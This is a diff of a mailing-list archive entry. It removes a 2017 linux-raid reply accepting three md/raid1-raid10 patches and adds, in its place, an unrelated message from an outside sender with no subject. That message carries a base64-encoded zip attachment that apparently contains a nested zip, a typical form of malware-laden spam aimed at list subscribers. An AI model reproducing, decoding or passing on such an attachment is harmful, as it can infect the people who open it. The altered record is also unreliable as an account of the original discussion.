@@ -1,46 +1,71 @@
-From: Shaohua Li <shli@kernel.org>
-Subject: Re: [PATCH v2 0/3] md: three misc changes
-Date: Mon, 17 Jul 2017 09:41:47 -0700
-Message-ID: <20170717164147.unwgwb4ekmwexc3m@kernel.org>
-References: <20170714081444.32645-1-ming.lei@redhat.com>
+From: <citydesk@thereporteronline.com>
+Subject: (unknown)
+Date: Mon, 17 Jul 2017 21:54:39 -0000
+Message-ID: <150032847951.17161.611510669498342854@perm.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-block-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20170714081444.32645-1-ming.lei@redhat.com>
-Sender: linux-block-owner@vger.kernel.org
-To: Ming Lei <ming.lei@redhat.com>
-Cc: linux-raid@vger.kernel.org, NeilBrown <neilb@suse.com>, linux-block@vger.kernel.org, Jens Axboe <axboe@fb.com>, Christoph Hellwig <hch@infradead.org>
+Content-Type: application/zip; name="EMAIL_976833055_linux-raid.zip
+Content-Transfer-Encoding: base64
+Return-path: <linux-raid-owner@vger.kernel.org>
+Content-Disposition: attachment
+Subject: 
+Sender: linux-raid-owner@vger.kernel.org
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-On Fri, Jul 14, 2017 at 04:14:41PM +0800, Ming Lei wrote:
-> This 1st patch fixes one issue introduced in the following two
-> commits:
-> 	Fixes: f0250618361d(md: raid10: don't use bio's vec table to manage resync pages)
-> 	Fixes: 98d30c5812c3(md: raid1: don't use bio's vec table to manage resync pages)
-> 
-> The 2nd one initializes bvec table of bio via bio_add_page() after bio_reset().
-> 
-> The 3rd one moves the common definitation and helpers into raid1-10.c. 
-
-applied, thanks!
- 
-> V2:
-> 	- fix 'page_idx' increasement in patch 1
-> 	- move raid1/raid10 common code to raid1-raid10.c, as suggested by Neil
-> 
-> Ming Lei (3):
->   md: remove 'idx' from 'struct resync_pages'
->   md: raid1/raid10: initialize bvec table via bio_add_page()
->   md: raid1-10: move raid1/raid10 common code into raid1-10.c
-> 
->  drivers/md/md.h       | 54 ----------------------------------
->  drivers/md/raid1-10.c | 81 +++++++++++++++++++++++++++++++++++++++++++++++++++
->  drivers/md/raid1.c    | 31 ++++----------------
->  drivers/md/raid10.c   | 19 ++++--------
->  4 files changed, 93 insertions(+), 92 deletions(-)
->  create mode 100644 drivers/md/raid1-10.c
-> 
-> -- 
-> 2.9.4
-> 
+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
